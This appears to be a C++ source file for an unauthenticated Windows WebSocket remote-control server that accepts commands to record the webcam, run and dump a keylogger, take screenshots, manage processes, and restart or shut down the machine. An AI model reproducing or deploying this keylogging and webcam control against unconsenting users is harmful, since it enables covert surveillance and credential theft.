#include <winsock2.h>
#include <ws2tcpip.h>
#include <iostream>
#include <string>
#include <fstream>
#include <thread>
#include <vector>
#include <atomic>

#include "Socket.h"
#include "CommandFactory.h"
#include "Webcam.h"
#include "SystemControl.h"
#include "Sender.h"
#include "AllCommand.h"
#include "WSDataType.h"

#pragma comment(lib, "ws2_32.lib")

static const char b64_table[] =
"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";


std::string base64Encode(const unsigned char* data, size_t len)
{
    std::string out;
    out.reserve((len + 2) / 3 * 4);

    for (size_t i = 0; i < len; i += 3) {
        unsigned int v = (data[i] << 16);
        if (i + 1 < len) v |= (data[i + 1] << 8);
        if (i + 2 < len) v |= (data[i + 2]);

        out.push_back(b64_table[(v >> 18) & 0x3F]);
        out.push_back(b64_table[(v >> 12) & 0x3F]);
        out.push_back((i + 1 < len) ? b64_table[(v >> 6) & 0x3F] : '=');
        out.push_back((i + 2 < len) ? b64_table[(v >> 0) & 0x3F] : '=');
    }

    return out;
}

class SHA1 {
public:
    SHA1() { reset(); }

    void update(const std::string& s) {
        for (unsigned char c : s)
            update(c);
    }

    void update(unsigned char c) {
        buffer[buf_len++] = c;
        if (buf_len == 64) {
            transform();
            buf_len = 0;
            transforms++;
        }
    }

    std::string final() {
        unsigned long long total_bits = (transforms * 512ULL) + (buf_len * 8ULL);

        update(0x80);
        while (buf_len != 56)
            update(0x00);

        for (int i = 7; i >= 0; i--)
            update((unsigned char)((total_bits >> (i * 8)) & 0xFF));

        unsigned char digest[20];
        for (int i = 0; i < 20; i++)
            digest[i] = (state[i >> 2] >> ((3 - (i & 3)) * 8)) & 0xFF;

        return std::string((char*)digest, 20);
    }

private:
    unsigned int state[5];
    unsigned char buffer[64];
    int buf_len;
    unsigned long long transforms;

    static inline unsigned int rol(unsigned int val, int bits) {
        return (val << bits) | (val >> (32 - bits));
    }

    void reset() {
        state[0] = 0x67452301;
        state[1] = 0xEFCDAB89;
        state[2] = 0x98BADCFE;
        state[3] = 0x10325476;
        state[4] = 0xC3D2E1F0;
        buf_len = 0;
        transforms = 0;
        memset(buffer, 0, 64);
    }

    void transform() {
        unsigned int w[80];
        for (int i = 0; i < 16; i++) {
            w[i] = (buffer[i * 4] << 24)
                | (buffer[i * 4 + 1] << 16)
                | (buffer[i * 4 + 2] << 8)
                | (buffer[i * 4 + 3]);
        }

        for (int i = 16; i < 80; i++)
            w[i] = rol(w[i - 3] ^ w[i - 8] ^ w[i - 14] ^ w[i - 16], 1);

        unsigned int a = state[0], b = state[1], c = state[2], d = state[3], e = state[4];

        for (int i = 0; i < 80; i++) {
            unsigned int f, k;

            if (i < 20) { f = (b & c) | ((~b) & d); k = 0x5A827999; }
            else if (i < 40) { f = b ^ c ^ d;           k = 0x6ED9EBA1; }
            else if (i < 60) { f = (b & c) | (b & d) | (c & d); k = 0x8F1BBCDC; }
            else { f = b ^ c ^ d;           k = 0xCA62C1D6; }

            unsigned int temp = rol(a, 5) + f + e + k + w[i];
            e = d;
            d = c;
            c = rol(b, 30);
            b = a;
            a = temp;
        }

        state[0] += a;
        state[1] += b;
        state[2] += c;
        state[3] += d;
        state[4] += e;
    }
};

//bool sendAll(SOCKET s, const char* data, int len)
//{
//    int total = 0;
//    while (total < len) {
//        int sent = send(s, data + total, len - total, 0);
//        if (sent <= 0) return false;
//        total += sent;
//    }
//    return true;
//}
//
//void sendWsFrame(SOCKET client, uint8_t opcode, bool fin,
//    const char* data, size_t len)
//{
//    std::vector<unsigned char> frame;
//    frame.push_back((fin ? 0x80 : 0x00) | opcode);
//
//    if (len <= 125) {
//        frame.push_back((unsigned char)len);
//    }
//    else if (len <= 65535) {
//        frame.push_back(126);
//        frame.push_back((len >> 8) & 0xFF);
//        frame.push_back(len & 0xFF);
//    }
//    else {
//        return;
//    }
//
//    frame.insert(frame.end(), data, data + len);
//
//    //  BẮT BUỘC
//    sendAll(client, (char*)frame.data(), frame.size());
//}
//
//void sendWsTextAuto(SOCKET client, const std::string& msg)
//{
//    const size_t CHUNK = 16 * 1024;
//
//    if (msg.size() <= CHUNK) {
//        sendWsFrame(client, 0x1, true, msg.data(), msg.size());
//        return;
//    }
//
//    // first frame
//    size_t offset = 0;
//    size_t len = CHUNK;
//    sendWsFrame(client, 0x1, false, msg.data(), len);
//    offset += len;
//
//    // continuation
//    while (offset < msg.size()) {
//        len = std::min(CHUNK, msg.size() - offset);
//        bool fin = (offset + len >= msg.size());
//        sendWsFrame(client, 0x0, fin, msg.data() + offset, len);
//        offset += len;
//    }
//}
//
//void sendWsAuto(SOCKET client, WSDataType type, const std::string& payload) {
//    std::string msg;
//
//    switch (type) {
//    case WSDataType::KEYLOG:
//        msg = "KEYLOG_DATA:" + payload;
//        break;
//
//    case WSDataType::IMAGE:
//        msg = "IMAGE_FRAME:" + payload; // payload = base64 jpeg
//        break;
//
//    case WSDataType::VIDEO:
//        msg = "RECORD_DONE:" + payload;
//        break;
//
//	case WSDataType::LISTAPP:
//        msg = payload;
//        break;
//    
//    case WSDataType::LISTPROC:
//        msg = "PROCESS_LIST:" + payload;
//		break;
//    }
//
//    //std::cout << "HEAD: " << msg.substr(0 , 20) << "\n";
//    sendWsTextAuto(client, msg);
//}

//void openWebcam(SOCKET client, std::string msg) {
//    ICommand* cmd = CommandFactory::create("record");
//    if (!cmd) return;
//    std::string result = cmd->execute("");
//    sendWsAuto(client, WSDataType::VIDEO, "/Video/record.mp4");
//    delete cmd;
//}

//void restartPC(SOCKET client, std::string msg) {
//    ICommand* cmd = CommandFactory::create(msg);
//    if (!cmd) return;
//    cmd->execute("");
//    delete cmd;
//}

//void shutdownPC(SOCKET client, std::string msg) {
//    ICommand* cmd = CommandFactory::create(msg);
//    if (!cmd) return;
//    cmd->execute("");
//    delete cmd;
//}

//void KeyLogger(SOCKET client, std::string msg) {
//    ICommand* cmd = CommandFactory::create("key");
//    if (!cmd) return;
//    std::string respone = cmd->execute(msg);
//    if (msg == "dump") {
//		sendWsAuto(client, WSDataType::KEYLOG , respone);
//    }
//	delete cmd;
//}

//void ScreenShot(SOCKET client, std::string msg) {
//    ICommand* cmd = CommandFactory::create(msg);
//    if (!cmd) return;
//    std::string respone = cmd->execute("");
//    sendWsAuto(client, WSDataType::IMAGE, respone);
//    delete cmd;
//}

//void ApplicationManager(SOCKET client, std::string msg1 , std::string msg2) {
//    ICommand* cmd = CommandFactory::create(msg1);
//    if (!cmd) return;
//    std::string response = cmd->execute(msg2);
//	if (msg2 == "list") 
//		sendWsAuto(client, WSDataType::LISTAPP, response);
//    //std::cout << response << "\n";
//    delete cmd;
//}

//void ProcessManager(SOCKET client, std::string msg1 , std::string msg2) {
//    ICommand* cmd = CommandFactory::create(msg1);
//    if (!cmd) return;
//    std::string response = cmd->execute(msg2);
//    if (msg2 == "list") 
//		sendWsAuto(client, WSDataType::LISTPROC, response);
//    delete cmd;
//}

    
bool websocketHandshake(SOCKET client, const std::string& request)
{
    size_t pos = request.find("Sec-WebSocket-Key: ");
    if (pos == std::string::npos) return false;

    std::string key = request.substr(pos + 19, 24);
    std::string magic = key + "258EAFA5-E914-47DA-95CA-C5AB0DC85B11";

    SHA1 sha;
    sha.update(magic);
    std::string hash = sha.final();

    std::string accept = base64Encode((unsigned char*)hash.c_str(), hash.size());

    std::string reply =
        "HTTP/1.1 101 Switching Protocols\r\n"
        "Upgrade: websocket\r\n"
        "Connection: Upgrade\r\n"
        "Sec-WebSocket-Accept: " + accept + "\r\n\r\n";

    int ret = send(client, reply.c_str(), reply.size(), 0);
    return ret != SOCKET_ERROR;
}


std::string decodeWebSocket(const char* data, int len)
{
    if (len < 6) return "";

    int payloadLen = data[1] & 0x7F;
    int maskIndex = 2;

    if (payloadLen == 126)
        maskIndex = 4;
    else if (payloadLen == 127)
        maskIndex = 10;

    unsigned char mask[4] = {
        (unsigned char)data[maskIndex],
        (unsigned char)data[maskIndex + 1],
        (unsigned char)data[maskIndex + 2],
        (unsigned char)data[maskIndex + 3]
    };

    int dataIndex = maskIndex + 4;

    std::string out;
    out.reserve(payloadLen);

    for (int i = 0; i < payloadLen; i++)
        out.push_back(data[dataIndex + i] ^ mask[i % 4]);

    return out;
}

void startSocketServer()
{
    WSADATA wsa;
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        std::cout << "WSAStartup failed\n";
        return;
    }

    SOCKET server = socket(AF_INET, SOCK_STREAM, 0);
    if (server == INVALID_SOCKET) {
        std::cout << "Socket create failed\n";
        return;
    }

    sockaddr_in addr{};
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = INADDR_ANY;
    addr.sin_port = htons(8081);

    if (bind(server, (sockaddr*)&addr, sizeof(addr)) == SOCKET_ERROR) {
        std::cout << "Bind failed\n";
        return;
    }

    listen(server, SOMAXCONN);
    std::cout << "WebSocket Server running on ws://127.0.0.1:8081\n";

    SOCKET client = accept(server, nullptr, nullptr);
    if (client == INVALID_SOCKET) {
        std::cout << "Accept failed\n";
        return;
    }

    char buffer[2048];
    int len = recv(client, buffer, sizeof(buffer) - 1, 0);
    if (len <= 0) {
        std::cout << "Handshake recv failed\n";
        closesocket(client);
        return;
    }
    buffer[len] = 0;

    if (!websocketHandshake(client, buffer)) {
        std::cout << "Handshake failed\n";
        closesocket(client);
        return;
    }

    std::cout << "Client connected\n";

    while (true)
    {
        len = recv(client, buffer, sizeof(buffer), 0);
        if (len <= 0) {
            std::cout << "Client disconnected\n";
            break;
        }

        std::string msg = decodeWebSocket(buffer, len);
        std::cout << "Client: " << msg << "\n";

        std::stringstream ss(msg);
        std::string msg1 = "", msg2 = "", msg3 = "";
        ss >> msg1 >> msg2 >> msg3;
        if (msg2 == "stop" || msg2 == "start") msg2 = msg2 + ' ' + msg3;

        if (msg1 == "webcam")   openWebcam(client, msg2);
        if (msg1 == "restart") restartPC(client, msg1);
        if (msg1 == "shutdown") shutdownPC(client, msg1);
		if (msg1 == "key") KeyLogger(client, msg2);
        if (msg1 == "screenshot") ScreenShot(client, msg1);
        if (msg1 == "application") ApplicationManager(client, msg1 , msg2);
		if (msg1 == "process") ProcessManager(client, msg1 , msg2);
    }

    closesocket(client);
    closesocket(server);
    //WSACleanup();
}
